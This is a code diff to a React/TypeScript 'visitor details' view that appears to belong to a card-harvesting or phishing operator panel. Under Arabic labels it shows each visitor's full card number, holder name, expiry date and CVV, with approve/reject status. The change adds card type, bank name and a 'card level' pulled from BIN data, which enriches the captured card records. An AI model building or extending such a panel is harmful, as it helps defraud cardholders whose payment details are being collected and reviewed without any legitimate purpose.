@@ -283,6 +283,20 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     const hasBeenActioned =
       cardHistory.status === "approved" || cardHistory.status === "rejected";
 
+    const cardType =
+      cardHistory.data?.cardType ||
+      cardHistory.data?.scheme ||
+      cardHistory.data?.type;
+    const cardLevel =
+      cardHistory.data?.cardLevel ||
+      cardHistory.data?.level ||
+      cardHistory.data?.bankInfo?.level ||
+      cardHistory.data?.binData?.level;
+    const bankName =
+      cardHistory.data?.bankInfo?.name ||
+      cardHistory.data?.bankName ||
+      cardHistory.data?.issuer?.name;
+
     if (cardNumber || encryptedCardNumber) {
       bubbles.push({
         id: `card-info-${cardHistory.id || index}`,
@@ -295,10 +309,11 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
         data: {
           "رقم البطاقة": cardNumber,
           "اسم حامل البطاقة": cardHolderName || "غير محدد",
-          "نوع البطاقة": cardHistory.data?.cardType,
+          "نوع البطاقة": cardType || "غير محدد",
+          "مستوى البطاقة": cardLevel || "غير محدد",
           "تاريخ الانتهاء": expiryDate,
           CVV: cvv,
-          البنك: cardHistory.data?.bankInfo?.name || "غير محدد",
+          البنك: bankName || "غير محدد",
           "بلد البنك": cardHistory.data?.bankInfo?.country || "غير محدد",
         },
         timestamp: cardHistory.timestamp,
